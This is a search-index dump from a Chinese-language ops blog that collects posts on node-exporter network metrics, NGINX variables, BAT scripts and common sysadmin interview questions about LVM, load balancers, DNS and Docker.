接收的目前所有建立连接的错误报文数 node_netstat_Tcp_OutSegs counter 报文数 TCP 发送的报文数（包括当前连接的段但是不包括重传的段) node_netstat_Tcp_RetransSegs counter 报文数 TCP 重传报文数 node_netstat_Tcp_CurrEstab counter 报文数 当前状态为 ESTABLISHED 或 CLOSE-WAIT 的 TCP 连接数 node_netstat_Tcp_ActiveOpens counter 报文数 已从 CLOSED 状态直接转换到 SYN-SENT 状态的 TCP 连接数 node_netstat_Tcp_PassiveOpens counter 报文数 已从 LISTEN 状态直接转换到 SYN-RCVD 状态的 TCP 平均连接数 node_netstat_TcpExt_ListenDrops counter 报文数 监听队列连接丢弃数 node_netstat_TcpExt_ListenOverflows counter 报文数 监听 socket 的队列溢出 node_netstat_TcpExt_SyncookiesFailed counter 报文数 接收的无效的 SYN cookies 的数量 node_netstat_TcpExt_SyncookiesRecv counter 报文数 接收的 SYN cookies 的数量 node_netstat_TcpExt_SyncookiesSent counter 报文数 发送的 SYN cookies 的数量 node_sockstat_TCP_alloc Graph 报文数 已分配（已建立、已申请到sk_buff）的TCP套接字数量 node_sockstat_TCP_inuse Graph 报文数 正在使用（正在侦听）的TCP套接字数量 node_sockstat_TCP_mem Graph 报文数 TCP 套接字缓冲区使用量 node_sockstat_TCP_orphan Graph 报文数 无主（不属于任何进程）的TCP连接数（无用、待销毁的TCP socket数） node_sockstat_TCP_tw Graph 报文数 等待关闭的TCP连接数 node_sockstat_TCP_mem_bytes Graph bytes TCP 套接字缓冲区比特数 ","date":"2023-09-21","objectID":"/posts/linux/prometheus_%E8%BF%9E%E6%8E%A5%E6%95%B0%E7%9B%B8%E5%85%B3%E6%8C%87%E6%A0%87/:1:0","tags":["linux","监控","prometheus","node-exporter"],"title":"node-exporter 连接数相关指标","uri":"/posts/linux/prometheus_%E8%BF%9E%E6%8E%A5%E6%95%B0%E7%9B%B8%E5%85%B3%E6%8C%87%E6%A0%87/"},{"categories":["linux","运维记事","整理收集"],"content":"UDP 相关指标 名称 类型 单位 说明 node_sockstat_UDPLITE_inuse Graph 报文数 正在使用的 UDP-Lite 套接字数量 node_sockstat_UDP_inuse Graph 报文数 正在使用的 UDP 套接字数量 node_sockstat_UDP_mem Graph 报文数 UDP 套接字缓冲区使用量 node_sockstat_UDP_mem_bytes Graph bytes UDP 套接字缓冲区比特数 node_netstat_Udp_InDatagrams Graph 报文数 接收的 UDP 数据包 node_netstat_Udp_OutDatagrams Graph 报文数 发送的 UDP 数据包 node_netstat_Udp_InErrors Graph 报文数 本机端口未监听之外的其他原因引起的 UDP 入包无法送达(应用层)的数量 node_netstat_Udp_NoPorts Graph 报文数 未知端口接收 UDP 数据包的数量 node_netstat_UdpLite_InErrors Graph 报文数 本机端口未监听之外的其他原因引起的 UDP-Lite 入包无法送达(应用层)的数量 ","date":"2023-09-21","objectID":"/posts/linux/prometheus_%E8%BF%9E%E6%8E%A5%E6%95%B0%E7%9B%B8%E5%85%B3%E6%8C%87%E6%A0%87/:2:0","tags":["linux","监控","prometheus","node-exporter"],"title":"node-exporter 连接数相关指标","uri":"/posts/linux/prometheus_%E8%BF%9E%E6%8E%A5%E6%95%B0%E7%9B%B8%E5%85%B3%E6%8C%87%E6%A0%87/"},{"categories":["linux","运维记事","整理收集"],"content":"UDP与UDP-lite的区别 传统的UDP协议是对其载荷（Payload）进行完整的校验的，如果其中的一些位（哪怕只有一位）发生了变化，那么整个数据包都有可能被丢弃，在某些情况下，丢掉这个包的代价是非常大的，尤其当包比较大的时候。在UDP-Lite协议中，一个数据包到底需不需要对其载荷进行校验，或者是校验多少位都是由用户控制的（leeming注释：这是这种可选择性，其实udp_lite的代码实现是比udp``复杂的，though 字面上有个lite），并且UDP-Lite协议就是用UDP协议的Length字段来表示其Checksum Coverage的，所以当UDP-Lite协议的Checksum Coverage字段等于整个UDP数据包（包括UDP头和载荷）的长度时，UDP-Lite产生的包也将和传统的UDP包一模一样。 ","date":"2023-09-21","objectID":"/posts/linux/prometheus_%E8%BF%9E%E6%8E%A5%E6%95%B0%E7%9B%B8%E5%85%B3%E6%8C%87%E6%A0%87/:3:0","tags":["linux","监控","prometheus","node-exporter"],"title":"node-exporter 连接数相关指标","uri":"/posts/linux/prometheus_%E8%BF%9E%E6%8E%A5%E6%95%B0%E7%9B%B8%E5%85%B3%E6%8C%87%E6%A0%87/"},{"categories":["linux","运维记事","整理收集"],"content":"ICMP Internet Control Message Protocol，ICMP是网路协议族的核心协议之一。它用于TCP/IP网络中发送控制消息，提供可能发生在通信环境中的各种问题反馈，通过这些信息，令管理者可以对所发生的问题作出诊断，然后采取适当的措施解决。 ICMP通常用于返回的错误信息或是分析路由。ICMP错误消息总是包括了源数据并返回给发送者。 ICMP错误消息的例子之一是TTL值过期。每个路由器在转发数据报的时候都会把ip包头中的TTL值减一。如果TTL值为0，TTL在传输中过期的消息将会回报给源地址。 名称 类型 单位 说明 node_netstat_Icmp_InErrors Graph 报文数 接收的 ICMP 错误的报文（例如ICMP校验和错误、长度错误等） node_netstat_Icmp_InMsgs Graph 报文数 接收的报文数 node_netstat_Icmp_OutMsgs Graph 报文数 发送的报文数 ","date":"2023-09-21","objectID":"/posts/linux/prometheus_%E8%BF%9E%E6%8E%A5%E6%95%B0%E7%9B%B8%E5%85%B3%E6%8C%87%E6%A0%87/:4:0","tags":["linux","监控","prometheus","node-exporter"],"title":"node-exporter 连接数相关指标","uri":"/posts/linux/prometheus_%E8%BF%9E%E6%8E%A5%E6%95%B0%E7%9B%B8%E5%85%B3%E6%8C%87%E6%A0%87/"},{"categories":["linux","运维记事","整理收集"],"content":"Sockstat 的其他指标 名称 类型 单位 说明 node_sockstat_sockets_used Graph 报文数 使用的所有协议套接字总量 node_sockstat_FRAG_inuse Graph 报文数 正在使用的 Frag 套接字数量 node_sockstat_FRAG_memory Graph 报文数 使用的 Frag 缓冲区 node_sockstat_RAW_inuse Graph 报文数 正在使用的 Raw 套接字数量 ","date":"2023-09-21","objectID":"/posts/linux/prometheus_%E8%BF%9E%E6%8E%A5%E6%95%B0%E7%9B%B8%E5%85%B3%E6%8C%87%E6%A0%87/:5:0","tags":["linux","监控","prometheus","node-exporter"],"title":"node-exporter 连接数相关指标","uri":"/posts/linux/prometheus_%E8%BF%9E%E6%8E%A5%E6%95%B0%E7%9B%B8%E5%85%B3%E6%8C%87%E6%A0%87/"},{"categories":["windows","整理收集"],"content":"常用的BAT脚本语法","date":"2023-04-06","objectID":"/posts/windows/%E5%B8%B8%E7%94%A8%E7%9A%84bat%E8%84%9A%E6%9C%AC%E8%AF%AD%E6%B3%95/","tags":["linux","windows","bat","转发内容"],"title":"常用的BAT脚本语法","uri":"/posts/windows/%E5%B8%B8%E7%94%A8%E7%9A%84bat%E8%84%9A%E6%9C%AC%E8%AF%AD%E6%B3%95/"},{"categories":["windows","整理收集"],"content":" 我们在日常工作中常常会遇到一些需要重复进行的工作，又或者我们的项目在转交客户时需要去简化配置过程 这时我们就需要使用到一些自动化部署操作，我们常常会采用脚本来完成这部分功能 下面我们来介绍一种脚本类型Bat脚本，我们会从以下方面介绍： 脚本介绍 Bat脚本基本语法 Bat脚本常用语法 Bat脚本进阶内容 引用 https://www.cnblogs.com/qiuluoyuweiliang/p/17288356.html ","date":"2023-04-06","objectID":"/posts/windows/%E5%B8%B8%E7%94%A8%E7%9A%84bat%E8%84%9A%E6%9C%AC%E8%AF%AD%E6%B3%95/:0:0","tags":["linux","windows","bat","转发内容"],"title":"常用的BAT脚本语法","uri":"/posts/windows/%E5%B8%B8%E7%94%A8%E7%9A%84bat%E8%84%9A%E6%9C%AC%E8%AF%AD%E6%B3%95/"},{"categories":["linux","整理收集"],"content":"NGINX中变量详解","date":"2023-03-20","objectID":"/posts/linux/nginx%E4%B8%AD%E5%8F%98%E9%87%8F%E8%AF%A6%E8%A7%A3/","tags":["linux","nginx"],"title":"NGINX中变量详解","uri":"/posts/linux/nginx%E4%B8%AD%E5%8F%98%E9%87%8F%E8%AF%A6%E8%A7%A3/"},{"categories":["linux","整理收集"],"content":" 以下为资料来源,由本站收集重新整理发布,仅用于个人收藏,转载请直接标注以下来源连接 http://www.hangdaowangluo.com/archives/754 ","date":"2023-03-20","objectID":"/posts/linux/nginx%E4%B8%AD%E5%8F%98%E9%87%8F%E8%AF%A6%E8%A7%A3/:0:0","tags":["linux","nginx"],"title":"NGINX中变量详解","uri":"/posts/linux/nginx%E4%B8%AD%E5%8F%98%E9%87%8F%E8%AF%A6%E8%A7%A3/"},{"categories":["linux","整理收集"],"content":"http Croe模块 - - $http_user_agent 客户端UA信息 $http_cookie 客户端COOKIE $cookie_name 参考$arg_name的用法 $arg_name 获取URI中的GET参数，比方说http://localhost:8080/test?class=3，则用$arg_class获取。注：1）不区分大小写，例如CLASS=2同样使用$arg_class获取；2）如果参数escape编码了，使用set_unescape_uri 反编码，例如：set_unescape_uri $name $arg_name;set_unescape_uri $class $arg_class;echo “name: $name”;echo “class: $class” $args 获取url中的GET参数字符串,www.129.com/?name=a1\u0026b=b1，$args=name=a1\u0026b=b1 $binary_remote_addr 二进制格式的客户端地址，例如\\xC0\\xA8P\\x81，表示为192.168.80.1 $body_bytes_sent 响应体的大小，即使发生了中断或者是放弃，也是一样的准确。 $bytes_sent number of bytes sent to a client $connection connection serial number $connection_requests current number of requests made through a connection $content_length 请求头部信息中的Content-Length $content_type 请求头部信息中的Content-Type $document_root 变量的值为当前请求的location（http，server，location，location中的if）中root指令中指定的值，或alias的值 $document_uri 同$uri $host 该变量的值等于请求头中Host的值。如果Host无效时，那么就是处理该请求的server的名称。在下列情况中，$host变量的取值不同于$http_host变量。1) 当请求头中的Host字段未指定（使用默认值）或者为空值，那么$host等于server_name指令指定的值。2) 当Host字段包含端口是，$host并不包含端口号。另外，从0.8.17之后的nginx中，$host的值总是小写。 $hostname 有gethostname返回值设置机器名 $http_name 该变量的值为HTTP 请求头HEADER，具体使用时会转换为小写，并且将“——”（破折号）转换为“_”(下划线)。例如$http_Connection $https “on” if connection operates in SSL mode, or an empty string otherwise $is_args “?” if a request line has arguments, or an empty string otherwise $limit_rate 该变量允许限制连接速率，参考 limit_rate $msec current time in seconds with the milliseconds resolution (1.3.9, 1.2.6) $nginx_version 版本 $pid Pid $pipe “p” if request was pipelined, “.” otherwise (1.3.12, 1.2.7) $query_string 同$args $realpath_root an absolute pathname corresponding to the root or alias directive’s value for the current request, with all symbolic links resolved to real paths $remote_addr 客户端的IP地址 $remote_port 客户端连接端口 $remote_user 变量等于用户的名字，基本身份验证模块使用 $request full original request line $request_body 该变量包含了请求体的主要信息。该变量与proxy_pass或者fastcgi_pass相关 $request_body_file 客户端请求体的临时文件 $request_completion 如果请求成功完成，那么显示“OK”。如果请求没有完成或者请求不是该请求系列的最后一部分，那么它的值为空。 $request_filename 该变量等于当前请求文件的路径，有指令root或者alias和URI构成 $request_id unique request identifier generated from 16 random bytes, in hexadecimal (1.11.0) $request_length request length (including request line, header, and request body) (1.3.12, 1.2.7) $request_method 该变量的值通常是GET或者POST。 $request_time request processing time in seconds with a milliseconds resolution (1.3.9, 1.2.6); time elapsed since the first bytes were read from the client $request_uri 该变量的值等于原始的URI请求，就是说从客户端收到的参数包括了原始请求的URI，该值是不可以被修改的，不包含主机名，例如“/foo/bar.php?arg=baz”。 $scheme 功能：该变量表示HTTP scheme（例如HTTP，HTTPS），根据实际使用情况来决定，例如：rewrite ^ $scheme://example.com$uri redirect; $sent_http_name arbitrary response header field; the last part of a variable name is the field name converted to lower case with dashes replaced by underscores $server_addr 该变量的值等于服务器的地址。通常来说，在完成一次系统调用之后就会获取变量的值，为了避开系统钓鱼，那么必须在listen指令中使用bind参数。 $server_name 该变量为server的名字。 $server_port 该变量等于接收请求的端口 $server_protocol 该变量的值为请求协议的值，通常是HTTP/1.0或者HTTP/1.1 $status response status (1.3.2, 1.2.2) $tcpinfo_rtt, $tcpinfo_rttvar, $tcpinfo_snd_cwnd, $tcpinfo_rcv_space information about the client TCP connection; available on systems that support the TCP_INFO socket option $time_iso8601 local time in the ISO 8601 standard format (1.3.12, 1.2.7) $time_local local time in the Common Log Format (1.3.12, 1.2.7) $uri 该变量的值等于当前请求中的URI（没有参数，不包括$args）的值。它的值不同于request_uri，由浏览器客户端发送的request_uri的值。例如，可能会被内部重定向或者使用index。另外需要注意：$uri不包含主机名，例如 “/foo/bar.html”当前判断URL= $scheme://$server_name/$uri ","date":"2023-03-20","objectID":"/posts/linux/nginx%E4%B8%AD%E5%8F%98%E9%87%8F%E8%AF%A6%E8%A7%A3/:1:0","tags":["linux","nginx"],"title":"NGINX中变量详解","uri":"/posts/linux/nginx%E4%B8%AD%E5%8F%98%E9%87%8F%E8%AF%A6%E8%A7%A3/"},{"categories":["linux","整理收集"],"content":"运维常见面试题","date":"2022-12-30","objectID":"/posts/linux/%E8%BF%90%E7%BB%B4%E5%B8%B8%E8%A7%81%E9%9D%A2%E8%AF%95%E9%A2%98/","tags":["linux","解决方案"],"title":"运维常见面试题","uri":"/posts/linux/%E8%BF%90%E7%BB%B4%E5%B8%B8%E8%A7%81%E9%9D%A2%E8%AF%95%E9%A2%98/"},{"categories":["linux","整理收集"],"content":"1. 请简述OSI七层网络模型有哪些层及各自的含义 物理层：底层数据传输，比如网线、网卡标准 数据链路层：定义数据的基本格式，如何传输，如何标识。比如网卡MAC地址 网络层：定义IP编码，定义路由功能，比如不同设备的数据转发 传输层：端到端传输数据的基本功能，比如TCP、UDP 会话层：控制应用程序之间会话能力，比如不同软件数据分发给不停软件 表示层：数据格式标识，基本压缩加密功能。 应用层：各种应用软件，包括 Web 应用。 ","date":"2022-12-30","objectID":"/posts/linux/%E8%BF%90%E7%BB%B4%E5%B8%B8%E8%A7%81%E9%9D%A2%E8%AF%95%E9%A2%98/:1:0","tags":["linux","解决方案"],"title":"运维常见面试题","uri":"/posts/linux/%E8%BF%90%E7%BB%B4%E5%B8%B8%E8%A7%81%E9%9D%A2%E8%AF%95%E9%A2%98/"},{"categories":["linux","整理收集"],"content":"2. 在Linux的LVM分区格式下，请简述给根分区磁盘扩容的步骤. 这个分3种 ","date":"2022-12-30","objectID":"/posts/linux/%E8%BF%90%E7%BB%B4%E5%B8%B8%E8%A7%81%E9%9D%A2%E8%AF%95%E9%A2%98/:2:0","tags":["linux","解决方案"],"title":"运维常见面试题","uri":"/posts/linux/%E8%BF%90%E7%BB%B4%E5%B8%B8%E8%A7%81%E9%9D%A2%E8%AF%95%E9%A2%98/"},{"categories":["linux","整理收集"],"content":"第一种方法: growpart /dev/vda 1 resize2fs /dev/vda1 ","date":"2022-12-30","objectID":"/posts/linux/%E8%BF%90%E7%BB%B4%E5%B8%B8%E8%A7%81%E9%9D%A2%E8%AF%95%E9%A2%98/:3:0","tags":["linux","解决方案"],"title":"运维常见面试题","uri":"/posts/linux/%E8%BF%90%E7%BB%B4%E5%B8%B8%E8%A7%81%E9%9D%A2%E8%AF%95%E9%A2%98/"},{"categories":["linux","整理收集"],"content":"第二种方法: partpeobe /dev/sda resize2fs /dev/vda1 ","date":"2022-12-30","objectID":"/posts/linux/%E8%BF%90%E7%BB%B4%E5%B8%B8%E8%A7%81%E9%9D%A2%E8%AF%95%E9%A2%98/:4:0","tags":["linux","解决方案"],"title":"运维常见面试题","uri":"/posts/linux/%E8%BF%90%E7%BB%B4%E5%B8%B8%E8%A7%81%E9%9D%A2%E8%AF%95%E9%A2%98/"},{"categories":["linux","整理收集"],"content":"第三种方法: fdisk /dev/sdb # n p 1 1 回车 回车 t 8e w pvcreate /dev/sdb1 vgextend datavg /dev/sdb1 lvextend -r -L +100%free /dev/mapper/datavg-lv01 ","date":"2022-12-30","objectID":"/posts/linux/%E8%BF%90%E7%BB%B4%E5%B8%B8%E8%A7%81%E9%9D%A2%E8%AF%95%E9%A2%98/:5:0","tags":["linux","解决方案"],"title":"运维常见面试题","uri":"/posts/linux/%E8%BF%90%E7%BB%B4%E5%B8%B8%E8%A7%81%E9%9D%A2%E8%AF%95%E9%A2%98/"},{"categories":["linux","整理收集"],"content":"3. 讲述一下Tomcat8005、8009、8080三个端口的含义？ 8005：关闭时使用 8009：为AJP端口，即容器使用，如Apache能通过AJP协议访问Tomcat的8009端口来实现功能 8080：一般应用使用 ","date":"2022-12-30","objectID":"/posts/linux/%E8%BF%90%E7%BB%B4%E5%B8%B8%E8%A7%81%E9%9D%A2%E8%AF%95%E9%A2%98/:6:0","tags":["linux","解决方案"],"title":"运维常见面试题","uri":"/posts/linux/%E8%BF%90%E7%BB%B4%E5%B8%B8%E8%A7%81%E9%9D%A2%E8%AF%95%E9%A2%98/"},{"categories":["linux","整理收集"],"content":"4. 简述DNS进行域名解析的过程？ 迭代查询（返回最优结果）、递归查询（本地找DNS）用户要访问 www.baidu.com，会先找本机的host文件，再找本地设置的DNS服务器，如果也没有找到，就去网络中找根服务器，根服务器反馈结果，说只能提供一级域名服务器.cn，就去找一级域名服务器，一级域名服务器说只能提供二级域名服务器.com.cn,就去找二级域名服务器，二级域服务器只能提供三级域名服务器.baidu.com.cn，就去找三级域名服务器，三级域名服务器正好有这个网站www.baidu.com，然后发给请求的服务器，保存一份之后，再发给客户端。 ","date":"2022-12-30","objectID":"/posts/linux/%E8%BF%90%E7%BB%B4%E5%B8%B8%E8%A7%81%E9%9D%A2%E8%AF%95%E9%A2%98/:7:0","tags":["linux","解决方案"],"title":"运维常见面试题","uri":"/posts/linux/%E8%BF%90%E7%BB%B4%E5%B8%B8%E8%A7%81%E9%9D%A2%E8%AF%95%E9%A2%98/"},{"categories":["linux","整理收集"],"content":"5. 讲一下Keepalived的工作原理？ 在一个虚拟路由器中，只有作为MASTER的VRRP(虚拟路由冗余协议)路由器会一直发送VRRP通告信息，BACKUP不会抢占MASTER，除非它的优先级更高。当MASTER不可用时(BACKUP收不到通告信息)多台BACKUP中优先级最高的这台会被抢占为MASTER。这种抢占是非常快速的(\u003c1s)，以保证服务的连续性由于安全性考虑，VRRP包使用了加密协议进行加密。BACKUP不会发送通告信息，只会接收通告信息。 ","date":"2022-12-30","objectID":"/posts/linux/%E8%BF%90%E7%BB%B4%E5%B8%B8%E8%A7%81%E9%9D%A2%E8%AF%95%E9%A2%98/:8:0","tags":["linux","解决方案"],"title":"运维常见面试题","uri":"/posts/linux/%E8%BF%90%E7%BB%B4%E5%B8%B8%E8%A7%81%E9%9D%A2%E8%AF%95%E9%A2%98/"},{"categories":["linux","整理收集"],"content":"6. LVS、Nginx、HAproxy有什么区别？工作中你怎么选择？ ","date":"2022-12-30","objectID":"/posts/linux/%E8%BF%90%E7%BB%B4%E5%B8%B8%E8%A7%81%E9%9D%A2%E8%AF%95%E9%A2%98/:9:0","tags":["linux","解决方案"],"title":"运维常见面试题","uri":"/posts/linux/%E8%BF%90%E7%BB%B4%E5%B8%B8%E8%A7%81%E9%9D%A2%E8%AF%95%E9%A2%98/"},{"categories":["linux","整理收集"],"content":"LVS： 抗负载能力强、工作在第4层仅作分发之用，没有流量的产生，这个特点也决定了它在负载均衡软件里的性能最强的； 无流量，同时保证了均衡器IO的性能不会受到大流量的影响； 工作稳定，自身有完整的双机热备方案，如LVS+Keepalived和LVS+Heartbeat； 应用范围比较广，可以对所有应用做负载均衡； 配置简单，因为没有可太多配置的东西，所以并不需要太多接触，大大减少了人为出错的几率； ","date":"2022-12-30","objectID":"/posts/linux/%E8%BF%90%E7%BB%B4%E5%B8%B8%E8%A7%81%E9%9D%A2%E8%AF%95%E9%A2%98/:10:0","tags":["linux","解决方案"],"title":"运维常见面试题","uri":"/posts/linux/%E8%BF%90%E7%BB%B4%E5%B8%B8%E8%A7%81%E9%9D%A2%E8%AF%95%E9%A2%98/"},{"categories":["linux","整理收集"],"content":"LVS的缺点： 软件本身不支持正则处理，不能做动静分离，这就凸显了Nginx/HAProxy+Keepalived的优势。 如果网站应用比较庞大，LVS/DR+Keepalived就比较复杂了，特别是后面有Windows Server应用的机器，实施及配置还有维护过程就比较麻烦，相对而言，Nginx/HAProxy+Keepalived就简单多了。 ","date":"2022-12-30","objectID":"/posts/linux/%E8%BF%90%E7%BB%B4%E5%B8%B8%E8%A7%81%E9%9D%A2%E8%AF%95%E9%A2%98/:11:0","tags":["linux","解决方案"],"title":"运维常见面试题","uri":"/posts/linux/%E8%BF%90%E7%BB%B4%E5%B8%B8%E8%A7%81%E9%9D%A2%E8%AF%95%E9%A2%98/"},{"categories":["linux","整理收集"],"content":"Nginx： 工作在第7层，应用层，可以针对http应用做一些分流的策略。比如针对域名、目录结构。它的正则比HAProxy更为强大和灵活； Nginx对网络的依赖非常小，理论上能ping通就就能进行负载功能 Nginx安装和配置简单 可以承担高的负载压力且稳定，一般能支撑超过几万次的并发量； Nginx不仅仅是一款优秀的负载均衡器/反向代理软件，它同时也是功能强大的Web应用服务器。Nginx在处理静态页面、特别是抗高并发方面相对apache有优势； Nginx作为Web反向代理加速缓存越来越成熟，速度比传统的Squid服务器更快 ","date":"2022-12-30","objectID":"/posts/linux/%E8%BF%90%E7%BB%B4%E5%B8%B8%E8%A7%81%E9%9D%A2%E8%AF%95%E9%A2%98/:12:0","tags":["linux","解决方案"],"title":"运维常见面试题","uri":"/posts/linux/%E8%BF%90%E7%BB%B4%E5%B8%B8%E8%A7%81%E9%9D%A2%E8%AF%95%E9%A2%98/"},{"categories":["linux","整理收集"],"content":"Nginx的缺点： Nginx不支持url来检测。 Nginx仅能支持http、https和Email协议 Nginx的Session的保持，Cookie的引导能力相对欠缺。 ","date":"2022-12-30","objectID":"/posts/linux/%E8%BF%90%E7%BB%B4%E5%B8%B8%E8%A7%81%E9%9D%A2%E8%AF%95%E9%A2%98/:13:0","tags":["linux","解决方案"],"title":"运维常见面试题","uri":"/posts/linux/%E8%BF%90%E7%BB%B4%E5%B8%B8%E8%A7%81%E9%9D%A2%E8%AF%95%E9%A2%98/"},{"categories":["linux","整理收集"],"content":"HAProxy： HAProxy是支持虚拟主机的，可以工作在4、7层(支持多网段)； 能够补充Nginx的一些缺点比如Session的保持，Cookie的引导等工作； 支持url检测后端的服务器； 它跟LVS一样，本身仅仅就只是一款负载均衡软件；单纯从效率上来讲HAProxy更会比Nginx有更出色的负载均衡速度，在并发处理上也是优于Nginx的； HAProxy可以对Mysql读进行负载均衡，对后端的MySQL节点进行检测和负载均衡，不过在后端的MySQL slaves数量超过10台时性能不如LVS； HAProxy的算法较多，达到8种； ","date":"2022-12-30","objectID":"/posts/linux/%E8%BF%90%E7%BB%B4%E5%B8%B8%E8%A7%81%E9%9D%A2%E8%AF%95%E9%A2%98/:14:0","tags":["linux","解决方案"],"title":"运维常见面试题","uri":"/posts/linux/%E8%BF%90%E7%BB%B4%E5%B8%B8%E8%A7%81%E9%9D%A2%E8%AF%95%E9%A2%98/"},{"categories":["linux","整理收集"],"content":"工作选择： HAproxy和Nginx由于可以做七层的转发，所以URL和目录的转发都可以做在很大并发量的时候我们就要选择LVS，像中小型公司的话并发量没那么大选择HAproxy或者Nginx足已，由于HAproxy由是专业的代理服务器配置简单，所以中小型企业推荐使用HAproxy。 ","date":"2022-12-30","objectID":"/posts/linux/%E8%BF%90%E7%BB%B4%E5%B8%B8%E8%A7%81%E9%9D%A2%E8%AF%95%E9%A2%98/:15:0","tags":["linux","解决方案"],"title":"运维常见面试题","uri":"/posts/linux/%E8%BF%90%E7%BB%B4%E5%B8%B8%E8%A7%81%E9%9D%A2%E8%AF%95%E9%A2%98/"},{"categories":["linux","整理收集"],"content":"7. docker的工作原理是什么，讲一下 docker是一个Client-Server结构的系统，docker守护进程运行在宿主机上，守护进程从客户端接受命令并管理运行在主机上的容器，容器是一个运行时环境，这就是我们说的集装箱。 ","date":"2022-12-30","objectID":"/posts/linux/%E8%BF%90%E7%BB%B4%E5%B8%B8%E8%A7%81%E9%9D%A2%E8%AF%95%E9%A2%98/:16:0","tags":["linux","解决方案"],"title":"运维常见面试题","uri":"/posts/linux/%E8%BF%90%E7%BB%B4%E5%B8%B8%E8%A7%81%E9%9D%A2%E8%AF%95%E9%A2%98/"},{"categories":["linux","整理收集"],"content":"8. docker的组成包含哪几大部分 一个完整的docker有以下几个部分组成： docker client：客户端，为用户提供一系列可执行命令，用户用这些命令实现跟 docker daemon 交互； docker daemon：守护进程，一般在宿主主机后台运行，等待接收来自客户端的请求消息； docker image：镜像，镜像run之后就生成为docker容器； docker container：容器，一个系统级别的服务，拥有自己的ip和系统目录结构；运行容器前需要本地存在对应的镜像，如果本地不存在该镜像则就去镜像仓库下载。 docker： 使用客户端-服务器 (C/S) 架构模式，使用远程api来管理和创建docker容器。docker 容器通过 docker 镜像来创建。容器与镜像的关系类似于面向对象编程中的对象与类。 ","date":"2022-12-30","objectID":"/posts/linux/%E8%BF%90%E7%BB%B4%E5%B8%B8%E8%A7%81%E9%9D%A2%E8%AF%95%E9%A2%98/:17:0","tags":["linux","解决方案"],"title":"运维常见面试题","uri":"/posts/linux/%E8%BF%90%E7%BB%B4%E5%B8%B8%E8%A7%81%E9%9D%A2%E8%AF%95%E9%A2%98/"},{"categories":["linux","整理收集"],"content":"9. docker与传统虚拟机的区别什么？ 传统虚拟机是需要安装整个操作系统的，然后再在上面安装业务应用，启动应用，通常需要几分钟去启动应用，而docker是直接使用镜像来运行业务容器的，其容器启动属于秒级别； Docker需要的资源更少，Docker在操作系统级别进行虚拟化，Docker容器和内核交互，几乎没有性能损耗，而虚拟机运行着整个操作系统，占用物理机的资源就比较多; Docker更轻量，Docker的架构可以共用一个内核与共享应用程序库，所占内存极小;同样的硬件环境，Docker运行的镜像数远多于虚拟机数量，对系统的利用率非常高; 与虚拟机相比，Docker隔离性更弱，Docker属于进程之间的隔离，虚拟机可实现系统级别隔离; Docker的安全性也更弱，Docker的租户root和宿主机root相同，一旦容器内的用户从普通用户权限提升为root权限，它就直接具备了宿主机的root权限，进而可进行无限制的操作。虚拟机租户root权限和宿主机的root虚拟机权限是分离的，并且虚拟机利用如Intel的VT-d和VT-x的ring-1硬件隔离技术，这种技术可以防止虚拟机突破和彼此交互，而容器至今还没有任何形式的硬件隔离; Docker的集中化管理工具还不算成熟，各种虚拟化技术都有成熟的管理工具，比如：VMware vCenter提供完备的虚拟机管理能力; Docker对业务的高可用支持是通过快速重新部署实现的，虚拟化具备负载均衡，高可用、容错、迁移和数据保护等经过生产实践检验的成熟保障机制，Vmware可承诺虚拟机99.999%高可用，保证业务连续性; 虚拟化创建是分钟级别的，Docker容器创建是秒级别的，Docker的快速迭代性，决定了无论是开发、测试、部署都可以节省大量时间; 虚拟机可以通过镜像实现环境交付的一致性，但镜像分发无法体系化，Docker在Dockerfile中记录了容器构建过程，可在集群中实现快速分发和快速部署。from wljslmz ","date":"2022-12-30","objectID":"/posts/linux/%E8%BF%90%E7%BB%B4%E5%B8%B8%E8%A7%81%E9%9D%A2%E8%AF%95%E9%A2%98/:18:0","tags":["linux","解决方案"],"title":"运维常见面试题","uri":"/posts/linux/%E8%BF%90%E7%BB%B4%E5%B8%B8%E8%A7%81%E9%9D%A2%E8%AF%95%E9%A2%98/"},{"categories":["linux","整理收集"],"content":"10. docker技术的三大核心概念是什么？ 镜像：镜像是一种轻量级、可执行的独立软件包，它包含运行某个软件所需的所有内容，我们把应用程序和配置依赖打包好形成一个可交付的运行环境(包括代码、运行时需要的库、环境变量和配置文件等)，这个打包好的运行环境就是image镜像文件。 容器：容器是基于镜像创建的，是镜像运行起来之后的一个实例，容器才是真正运行业务程序的地方。如果把镜像比作程序里面的类，那么容器就是对象。 镜像仓库：存放镜像的地方，研发工程师打包好镜像之后需要把镜像上传到镜像仓库中去，然后就可以运行有仓库权限的人拉取镜像来运行容器了。 ","date":"2022-12-30","objectID":"/posts/linux/%E8%BF%90%E7%BB%B4%E5%B8%B8%E8%A7%81%E9%9D%A2%E8%AF%95%E9%A2%98/:19:0","tags":["linux","解决方案"],"title":"运维常见面试题","uri":"/posts/linux/%E8%BF%90%E7%BB%B4%E5%B8%B8%E8%A7%81%E9%9D%A2%E8%AF%95%E9%A2%98/"},{"categories":["linux","整理收集"],"content":"11. centos镜像几个G，但是docker centos镜像才几百兆，这是为什么？ 一个完整的Linux操作系统包含Linux内核和rootfs根文件系统，即我们熟悉的/dev、/proc/、/bin等目录。我们平时看到的centOS除了rootfs，还会选装很多软件，服务，图形桌面等，所以centOS镜像有好几个G也不足为奇。 而对于容器镜像而言，所有容器都是共享宿主机的Linux 内核的，而对于docker镜像而言，docker镜像只需要提供一个很小的rootfs即可，只需要包含最基本的命令，工具，程序库即可，所有docker镜像才会这么小。 ","date":"2022-12-30","objectID":"/posts/linux/%E8%BF%90%E7%BB%B4%E5%B8%B8%E8%A7%81%E9%9D%A2%E8%AF%95%E9%A2%98/:20:0","tags":["linux","解决方案"],"title":"运维常见面试题","uri":"/posts/linux/%E8%BF%90%E7%BB%B4%E5%B8%B8%E8%A7%81%E9%9D%A2%E8%AF%95%E9%A2%98/"},{"categories":["linux","整理收集"],"content":"12. 讲一下镜像的分层结构以及为什么要使用镜像的分层结构？ 一个新的镜像其实是从 base 镜像一层一层叠加生成的。每安装一个软件，dockerfile中使用RUM命令，就会在现有镜像的基础上增加一层，这样一层一层的叠加最后构成整个镜像。所以我们docker pull拉取一个镜像的时候会看到docker是一层层拉去的。 分层机构最大的一个好处就是 ：共享资源。比如：有多个镜像都从相同的 base 镜像构建而来，那么 Docker Host 只需在磁盘上保存一份 base 镜像；同时内存中也只需加载一份 base 镜像，就可以为所有容器服务了。而且镜像的每一层都可以被共享。 